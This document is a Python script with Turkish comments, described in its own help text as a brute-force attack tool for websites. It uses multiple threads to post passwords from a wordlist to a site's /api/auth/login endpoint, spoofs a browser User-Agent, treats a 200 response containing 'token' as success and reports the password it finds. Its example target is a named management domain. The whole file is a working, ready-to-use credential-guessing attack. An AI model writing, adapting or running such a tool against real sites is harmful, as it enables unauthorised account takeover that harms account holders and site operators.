import requests
import argparse
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

def login_attempt(session, url, username, password):
    """
    Attempts to log in with a single username and password.
    """
    # API endpoint'i ve gönderilecek veri.
    # Eğer bu bilgiler yanlışsa, tarayıcınızın geliştirici araçlarının 
    # "Ağ" (Network) sekmesini kullanarak doğru değerleri bulabilirsiniz.
    login_url = f"{url.rstrip('/')}/api/auth/login"
    payload = {
        'username': username,
        'password': password
    }
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        response = session.post(login_url, headers=headers, json=payload, timeout=10)
        # Giriş başarılı olduğunda sunucunun 200 durum kodu döndürdüğünü varsayıyoruz.
        # Farklı bir başarı durumu (örn. yönlendirme veya farklı bir kod) varsa, 
        # buradaki koşulu güncellemeniz gerekebilir.
        if response.status_code == 200 and 'token' in response.text:
            return password
    except requests.exceptions.RequestException as e:
        # Hataları sessizce geçebilir veya loglayabilirsiniz.
        # print(f"Hata: {password} - {e}", file=sys.stderr)
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description='Web sitesi için kaba kuvvet saldırı aracı.')
    parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net)')
    parser.add_argument('-u', '--username', required=True, help='Giriş için kullanılacak kullanıcı adı.')
    parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosyanın yolu.')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Aynı anda çalışacak iş parçacığı sayısı.')

    args = parser.parse_args()

    print(f"[*] Hedef: {args.url}")
    print(f"[*] Kullanıcı Adı: {args.username}")
    print(f"[*] Şifre Listesi: {args.wordlist}")
    print(f"[*] Thread Sayısı: {args.threads}")

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
        sys.exit(1)

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            # tqdm ile bir ilerleme çubuğu oluştur
            with tqdm(total=len(passwords), desc="Şifreler deneniyor", unit="pw") as pbar:
                futures = [executor.submit(login_attempt, session, args.url, args.username, password) for password in passwords]
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        print(f"\n[+] Başarılı! Şifre bulundu: {result}")
                        # Diğer thread'leri iptal et ve çık
                        executor.shutdown(wait=False, cancel_futures=True)
                        return
                    pbar.update(1)

    print("\n[-] Şifre bulunamadı.")

if __name__ == '__main__':
    main() 